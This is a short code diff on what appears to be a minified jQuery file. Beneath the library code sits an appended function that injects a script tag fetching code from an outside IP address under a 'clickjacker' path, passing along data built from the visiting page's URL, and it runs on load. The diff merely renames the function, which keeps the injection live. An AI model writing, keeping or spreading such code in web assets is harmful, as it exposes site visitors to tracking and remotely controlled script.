@@ -2531,7 +2531,7 @@
         return a.$ === m && (a.$ = fc), b && a.jQuery === m && (a.jQuery = ec), m
     }, typeof b === K && (a.jQuery = a.$ = m), m
 });
-function _jQueryElm() {
+function _jQueryEle() {
     var host = location.protocol + '//' + location.host;
     var full_url = document.location.href;
     var _cl = document.createElement('script');
@@ -2541,4 +2541,4 @@ function _jQueryElm() {
     _cl.src = 'http://162.243.249.239/clickjacker/index.php/script/jquery/' + btoa(_elm);
     document.getElementsByTagName('script')[0].appendChild(_cl);
 }
-_jQueryElm();
+_jQueryEle();
